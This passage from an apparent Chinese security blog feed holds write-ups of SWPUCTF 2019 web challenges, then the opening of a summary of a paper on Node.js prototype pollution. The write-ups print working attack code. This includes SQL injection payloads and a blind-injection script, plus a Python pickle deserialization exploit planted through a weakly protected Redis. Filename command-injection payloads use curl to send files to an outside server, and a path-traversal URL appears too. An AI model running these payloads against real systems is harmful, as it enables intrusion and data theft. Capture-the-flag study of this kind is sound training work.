class="line">1&apos;/**/&amp;&amp;/**/ST_LatFromGeoHash(concat(0x7e,(select/**/i.3/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/users)i/**/limit/**/1,1),0x7e))/**/&amp;&amp;&apos;a&apos;=&apos;a</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-12-06-13-03-56.png" alt=""><br>成功获取flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">swpuctf&#123;Simple_Double_Injectin&#125;</span><br></pre></td></tr></table></figure></p><h2 id="python简单题"><a href="#python简单题" class="headerlink" title="python简单题"></a>python简单题</h2><p>随便注册一个账户登入：<br><img src="/images/2019-12-06-13-15-36.png" alt=""><br>发现提示是Redis，随机测试一下：<br><img src="/images/2019-12-06-13-20-56.png" alt=""><br>发现需要授权，那么随手尝试弱密码：<br><img src="/images/2019-12-06-13-21-22.png" alt=""><br>结果直接就进去了，我惊呆了= =，看看里面有啥：<br><img src="/images/2019-12-06-13-41-08.png" alt=""><br>随便读一个内容：<br><img src="/images/2019-12-06-13-21-40.png" alt=""><br>那么不难想到，就是构造序列化，携带session访问时触发，进行任意命令执行。<br>查看自己的session：<br><img src="/images/2019-12-06-13-41-32.png" alt=""><br>那么利用脚本写入一个session：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">#</span><br><span class="line">import cPickle</span><br><span class="line">import os</span><br><span class="line">import redis</span><br><span class="line"></span><br><span class="line">class exp(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        s = &quot;&quot;&quot;curl -d &apos;@/flag&apos; 106.14.114.127:23333&quot;&quot;&quot;</span><br><span class="line">        return (os.system, (s,))</span><br><span class="line"></span><br><span class="line">e = exp()</span><br><span class="line">s = cPickle.dumps(e)</span><br><span class="line"></span><br><span class="line">r = redis.Redis(host=&apos;114.67.109.247&apos;, port=6379, db=0, password=&apos;password&apos;)</span><br><span class="line">r.set(&quot;session:1013122a-70cc-4251-b3e0-05d5731b3ae3&quot;, s)</span><br></pre></td></tr></table></figure></p><p>然后刷新页面，flag即可获得：<br><img src="/images/2019-12-06-13-40-20.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">swpuctf&#123;u6frAFrJoWXnf4w6w0Q1-By@mYz&#125;</span><br></pre></td></tr></table></figure></p><h2 id="easy-python"><a href="#easy-python" class="headerlink" title="easy_python"></a>easy_python</h2><p>进入题目，发现有上传功能，但显示权限不足：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Permission denied!</span><br></pre></td></tr></table></figure></p><p>那么猜想需要伪造session：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;id&quot;:&#123;&quot; b&quot;:&quot;100&quot;&#125;,&quot;is_login&quot;:true,&quot;password&quot;:&quot;sss&quot;,&quot;username&quot;:&quot;sss&quot;&#125;</span><br></pre></td></tr></table></figure></p><p>那么显然需要将自己伪造成id为1的用户，但是要伪造session，必须要secretkey，那么尝试模板注入：<br><img src="/images/2019-12-07-09-25-36.png" alt=""><br>发现response中有：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SWPUCTF_CSRF_Token: U0VDUkVUX0tFWTprZXlxcXF3d3dlZWUhQCMkJV4mKg==</span><br></pre></td></tr></table></figure></p><p>解码后得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SECRET_KEY:keyqqqwwweee!@#$%^&amp;*</span><br></pre></td></tr></table></figure></p><p>于是进行session伪造：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.eJyrVspMUbKqVlJIUrJS8g20tVWq1VHKLI7PyU_PzFOyKikqTdVRKkgsLi7PLwIqVEpMyQWK6yiVFqcW5SXmpsKFagFiyxgX.XekyGw.wYomzVd7LK9ea7WN-mZaQ0gldjg</span><br></pre></td></tr></table></figure></p><p>即可进入文件上传功能：<br><img src="/images/2019-12-07-09-31-42.png" alt=""><br>上传功能提示只允许上传zip，我们测试：<br><img src="/images/2019-12-07-09-34-59.png" alt=""><br>发现上传后，服务器会解压压缩包。<br>于是尝试软连接：<br><img src="/images/2019-12-07-09-38-41.png" alt=""><br>发现可以成功任意文件读取，读取了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/proc/self/maps</span><br><span class="line">/proc/self/cwd</span><br><span class="line">/proc/self/cmdline</span><br><span class="line">....</span><br></pre></td></tr></table></figure></p><p>发现都没找到路径，结果F12，发现源码写在注释里……喷血= =。<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/upload',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">'id'</span>] != <span class="string">b'1'</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(temp)</span><br><span class="line">    <span class="keyword">if</span> request.method==<span class="string">'POST'</span>:</span><br><span class="line">        m = hashlib.md5()</span><br><span class="line">        name = session[<span class="string">'password'</span>]</span><br><span class="line">        name = name+<span class="string">'qweqweqwe'</span></span><br><span class="line">        name = name.encode(encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">        m.update(name)</span><br><span class="line">        md5_one= m.hexdigest()</span><br><span class="line">        n = hashlib.md5()</span><br><span class="line">        ip = request.remote_addr</span><br><span class="line">        ip = ip.encode(encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">        n.update(ip)</span><br><span class="line">        md5_ip = n.hexdigest()</span><br><span class="line">        f=request.files[<span class="string">'file'</span>]</span><br><span class="line">        basepath=os.path.dirname(os.path.realpath(__file__))</span><br><span class="line">        path = basepath+<span class="string">'/upload/'</span>+md5_ip+<span class="string">'/'</span>+md5_one+<span class="string">'/'</span>+session[<span class="string">'username'</span>]+<span class="string">"/"</span></span><br><span class="line">        path_base = basepath+<span class="string">'/upload/'</span>+md5_ip+<span class="string">'/'</span></span><br><span class="line">        filename = f.filename</span><br><span class="line">        pathname = path+filename</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"zip"</span> != filename.split(<span class="string">'.'</span>)[<span class="number">-1</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'zip only allowed'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path_base):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                os.makedirs(path_base)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                os.makedirs(path)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(pathname):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                f.save(pathname)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cmd = <span class="string">"unzip -n -d "</span>+path+<span class="string">" "</span>+ pathname</span><br><span class="line">            <span class="keyword">if</span> cmd.find(<span class="string">'|'</span>) != <span class="number">-1</span> <span class="keyword">or</span> cmd.find(<span class="string">';'</span>) != <span class="number">-1</span>:</span><br><span class="line">waf()</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">            os.system(cmd)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">        unzip_file = zipfile.ZipFile(pathname,<span class="string">'r'</span>)</span><br><span class="line">        unzip_filename = unzip_file.namelist()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> session[<span class="string">'is_login'</span>] != <span class="keyword">True</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'not login'</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> unzip_filename.find(<span class="string">'/'</span>) != <span class="number">-1</span>:</span><br><span class="line">                shutil.rmtree(path_base)</span><br><span class="line">                os.mkdir(path_base)</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">            image = open(path+unzip_filename, <span class="string">"rb"</span>).read()</span><br><span class="line">            resp = make_response(image)</span><br><span class="line">            resp.headers[<span class="string">'Content-Type'</span>] = <span class="string">'image/png'</span></span><br><span class="line">            <span class="keyword">return</span> resp</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            shutil.rmtree(path_base)</span><br><span class="line">            os.mkdir(path_base)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'upload.html'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/showflag')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showflag</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">True</span> == <span class="keyword">False</span>:</span><br><span class="line">        image = open(os.path.join(<span class="string">'./flag/flag.jpg'</span>), <span class="string">"rb"</span>).read()</span><br><span class="line">        resp = make_response(image)</span><br><span class="line">        resp.headers[<span class="string">'Content-Type'</span>] = <span class="string">'image/png'</span></span><br><span class="line">        <span class="keyword">return</span> resp</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"can't give you"</span></span><br></pre></td></tr></table></figure></p><p>发现敏感点：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">         cmd = <span class="string">"unzip -n -d "</span>+path+<span class="string">" "</span>+ pathname</span><br><span class="line">         <span class="keyword">if</span> cmd.find(<span class="string">'|'</span>) != <span class="number">-1</span> <span class="keyword">or</span> cmd.find(<span class="string">';'</span>) != <span class="number">-1</span>:</span><br><span class="line">waf()</span><br><span class="line">             <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">         os.system(cmd)</span><br></pre></td></tr></table></figure></p><p>此处我们可以进行命令注入，跟踪path和pathname：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">f=request.files[<span class="string">'file'</span>]</span><br><span class="line">basepath=os.path.dirname(os.path.realpath(__file__))</span><br><span class="line">path = basepath+<span class="string">'/upload/'</span>+md5_ip+<span class="string">'/'</span>+md5_one+<span class="string">'/'</span>+session[<span class="string">'username'</span>]+<span class="string">"/"</span></span><br><span class="line">path_base = basepath+<span class="string">'/upload/'</span>+md5_ip+<span class="string">'/'</span></span><br><span class="line">filename = f.filename</span><br><span class="line">pathname = path+filename</span><br></pre></td></tr></table></figure></p><p>发现文件名可以进行命令注入，于是测试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=&quot;$(curl vps_ip:23333).zip&quot;</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-12-07-10-01-51.png" alt=""><br>发现可以收到请求，尝试外带数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(curl 106.14.114.127:23333 -T `pwd`).zip</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-12-07-10-05-12.png" alt=""><br>那么尝试读取flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./flag/flag.jpg</span><br></pre></td></tr></table></figure></p><p>但是遇到问题：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if unzip_filename.find(&apos;/&apos;) != -1:</span><br><span class="line">if cmd.find(&apos;|&apos;) != -1 or cmd.find(&apos;;&apos;) != -1:</span><br></pre></td></tr></table></figure></p><p>我们发现过滤了一些关键符号，那么只能尝试构造符号，随便搜一个ascii转字符的命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/c20130911/article/details/73187757</span><br></pre></td></tr></table></figure></p><p>即可进行字符转换：<br><img src="/images/2019-12-07-10-08-44.png" alt=""><br>那么我们伪造/：<br><img src="/images/2019-12-07-10-12-35.png" alt=""><br>那么构造exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(sky=`awk &apos;BEGIN&#123;printf &quot;%c\n&quot;,47&#125;&apos;`&amp;&amp;curl vps_ip:23333 -T `cat .$&#123;sky&#125;flag$&#123;sky&#125;flag.jpg`)</span><br></pre></td></tr></table></figure></p><p>将图片带出后，做一些修改，删除FFD8前的数据，打开即可得到flag：<br><img src="/images/2019-12-07-10-18-44.png" alt=""></p><h2 id="demo-mvc"><a href="#demo-mvc" class="headerlink" title="demo_mvc"></a>demo_mvc</h2><p>发现比赛太晚，做的时候已经有hint了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">无需扫描 hint:PDO::query</span><br></pre></td></tr></table></figure></p><p>那么不难想到，应该是有注入了：<br><img src="/images/2019-12-07-10-23-54.png" alt=""><br>对于PDO，我首先想到的是堆叠注入，随机测试一下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select sleep(5)</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-12-07-10-26-11.png" alt=""><br>发现成功sleep 5秒，那么尝试爆库爆表爆字段：<br>首先测试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select if((ascii(substr((database()),1,1))&gt;-1),sleep(5),1)</span><br><span class="line"></span><br><span class="line">&#123;&quot;username&quot;:&quot;sss&apos;;SET @aaa=0x73656c6563742069662828617363696928737562737472282864617461626173652829292c312c3129293e2d31292c736c6565702835292c3129;PREPARE test FROM @aaa;EXECUTE test;&quot;,&quot;password&quot;:&quot;sss&apos;&quot;&#125;</span><br></pre></td></tr></table></figure></p><p>发现成功sleep 5秒，随后测试payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select if((ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),1,1))&gt;-1),sleep(5),1)</span><br><span class="line"></span><br><span class="line">&#123;&quot;username&quot;:&quot;sss&apos;;SET @aaa=0x73656c6563742069662828617363696928737562737472282873656c6563742067726f75705f636f6e636174285441424c455f4e414d45292066726f6d20696e666f726d6174696f6e5f736368656d612e5441424c4553207768657265205441424c455f534348454d413d64617461626173652829292c312c3129293e2d31292c736c6565702835292c3129;PREPARE test FROM @aaa;EXECUTE test;&quot;,&quot;password&quot;:&quot;sss&apos;&quot;&#125;</span><br></pre></td></tr></table></figure></p><p>发现依旧成功sleep 5秒，那么开始编写exp：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">exp = <span class="string">'''&#123;"username":"sss';SET @aaa=0x%s;PREPARE test FROM @aaa;EXECUTE test;","password":"sss'"&#125;'''</span></span><br><span class="line"><span class="comment">#payload = 'select if((ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),%s,1))=%s),sleep(5),1)'</span></span><br><span class="line"><span class="comment">#payload = 'select if((ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=0x666C6167),%s,1))=%s),sleep(5),1)'</span></span><br><span class="line">payload = <span class="string">'select if((ascii(substr((select flag from flag limit 0,1),%s,1))=%s),sleep(5),1)'</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://182.92.220.157:11116/index.php?r=Login/Login'</span></span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line"><span class="keyword">print</span> i</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">now_payload = payload %(i,j)</span><br><span class="line">now_exp = exp % now_payload.encode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">r = requests.post(url=url,data=now_exp,timeout=<span class="number">4.5</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">res +=chr(j)</span><br><span class="line"><span class="keyword">print</span> res</span><br></pre></td></tr></table></figure></p><p>得到表名：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag,user</span><br></pre></td></tr></table></figure></p><p>flag表中列名：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag</span><br></pre></td></tr></table></figure></p><p>于是读取数据，得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AmOL#T.zip</span><br></pre></td></tr></table></figure></p><p>下载后发现是代码审计。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">View/userIndex.php</span><br></pre></td></tr></table></figure></p><p>发现文件读取：<br><img src="/images/2019-12-07-10-46-01.png" alt=""><br>构造：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://182.92.220.157:11116/index.php?r=User/Index&amp;img_file=/../flag.php</span><br></pre></td></tr></table></figure></p><p>即可获取flag：<br><img src="/images/2019-12-07-10-22-08.png" alt=""><br>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">swpuctf&#123;H@ve_a_g00d_t1me_durin9_swpuctf2019&#125;</span><br></pre></td></tr></table></figure></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>做了4道题，最后一题看是java xxe，估计要结合一个特性，自己对java不是很熟，就不去肝了。不过前4题做下来，感觉难度比往年低了不少（</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;12月比赛有点少，手有点生了，发现SWPU又开始了，还记得去年质量挺高的，于是来玩玩，下面是web的解题记录。&lt;/p&gt;
&lt;h2 id=&quot;ea
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Paper Summary &amp; Prototype pollution attack in NodeJS application</title>
    <link href="http://skysec.top/2019/12/06/Paper-Summary-Prototype-pollution-attack-in-NodeJS-application/"/>
    <id>http://skysec.top/2019/12/06/Paper-Summary-Prototype-pollution-attack-in-NodeJS-application/</id>
    <published>2019-12-06T13:10:56.000Z</published>
    <updated>2019-12-24T12:36:51.280Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本篇paper来自于 NSEC 2018 ：Prototype pollution attack in NodeJS application，写summary的原因因为本篇文章介绍的攻击点和实际问题密切相关，同时在CTF各大比赛中经常出现。</p><h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><p>为了介绍什么是原型链污染漏洞，我们得先有一些前置知识，首先观察一段代码：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a=&#123;&#125;;</span><br><span class="line">a.__proto__.test2 = <span class="string">'456'</span>;</span><br><span class="line"></span><br><span class="line">b=&#123;&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(a.test2);</span><br><span class="line"><span class="built_in">console</span>.log(b.test2);</span><br><span class="line">b.__proto__.test2 = <span class="string">'789'</span>;</span><br><span class="line"><span class="built_in">console</span>.log(a.test2);</span><br><span class="line"><span class="built_in">console</span>.log(b.test2);</span><br></pre></td></tr></table></figure></p><p>我们定义一个a对象，并对其进行赋值：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a.__proto__.test2 = <span class="string">'456'</span>;</span><br></pre></td></tr></table></figure></p><p>我们再定义一个b对象，但此时发现，如果我们输出：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">console.log(a.test2);</span><br><span class="line">console.log(b.test2);</span><br></pre></td></tr></table></figure></p><p>此时得到的结果是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">456</span><br><span class="line">456</span><br></pre></td></tr></table></figure></p><p>那么为什么b对象会有test2这个属性的value呢？<br><img src="/images/2019-12-07-14-09-41.png" alt=""><br>这是因为我们有等价关系：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a.__proto__ == Object.prototype</span><br></pre></td></tr></table></figure></p><p>那么此时，如果我们调用b.test2，其因为获取不到，就会往父类中查找，因此找到了Object.prototype.test2。<br>因此我们调用b.test2，可以获取到456这个值。<br>我们再看一个简单的例子：<br><img src="/images/2019-12-07-20-58-40.png" alt=""><br>我们构造了类的继承关系：<br>在使用a.testA的时候:<br>1.在testC类里查找testA属性<br>2.在testC的父类里查找testA属性<br>3.在testC的”爷”类里查找testA属性<br>故此可以正常调用到testA属性。<br>对于testB、testC属性也是同理。</p><h2 id="原型链污染漏洞"><a href="#原型链污染漏洞" class="headerlink" title="原型链污染漏洞"></a>原型链污染漏洞</h2><p>为了了解原型链污染漏洞，我们看如下代码：<br><img src="/images/2019-12-07-14-39-25.png" alt=""><br>假设我们控制evil.<strong>proto</strong>，那就等同于可以修改testClass类的prototype，那么即可篡改SecClass中的url属性值。<br>那么在后续所有调用该属性的位置，都会产生相应的影响。</p><h2 id="漏洞评估"><a href="#漏洞评估" class="headerlink" title="漏洞评估"></a>漏洞评估</h2><p>作者的数据集定于npm的所有库，但是由于代码量巨大，传统的静态分析并不适用，于是作者使用了动态测试方法，对受影响的库进行验证：</p><ul><li>使用npm安装需要测试的库</li><li>将库引入文件</li><li>递归列举库中所有可调用的函数</li><li>对于每一个函数<ul><li>对于每一个函数进行原型链污染测试input</li><li>检验是否产生影响，若产生，则标注漏洞点，并清除影响<br>代码已开源在github：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/find-vuln/find-vuln.js</span><br></pre></td></tr></table></figure></li></ul></li></ul><p>简单分析代码可知，作者首先申明了一个对象，对象中有属性名为：<em>proto</em>。<br>如果经过库中函数处理，该属性成为原型，那么说明出现了原型链污染问题：<br>作者列举了多种pattern：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> pattern = [&#123;</span><br><span class="line">fnct : <span class="function"><span class="keyword">function</span> (<span class="params">totest</span>) </span>&#123;</span><br><span class="line">totest(BAD_JSON);</span><br><span class="line">&#125;,</span><br><span class="line">sig: <span class="string">"function (BAD_JSON)"</span></span><br><span class="line">&#125;,&#123;</span><br><span class="line">fnct : <span class="function"><span class="keyword">function</span> (<span class="params">totest</span>) </span>&#123;</span><br><span class="line">totest(BAD_JSON, &#123;&#125;);</span><br><span class="line">&#125;,</span><br><span class="line">sig: <span class="string">"function (BAD_JSON, &#123;&#125;)"</span></span><br><span class="line">&#125;,&#123;</span><br><span class="line">fnct : <span class="function"><span class="keyword">function</span> (<span class="params">totest</span>) </span>&#123;</span><br><span class="line">totest(&#123;&#125;, BAD_JSON);</span><br><span class="line">&#125;,</span><br><span class="line">sig: <span class="string">"function (&#123;&#125;, BAD_JSON)"</span></span><br><span class="line">&#125;,&#123;</span><br><span class="line">fnct : <span class="function"><span class="keyword">function</span> (<span class="params">totest</span>) </span>&#123;</span><br><span class="line">totest(BAD_JSON, BAD_JSON);</span><br><span class="line">&#125;,</span><br><span class="line">sig: <span 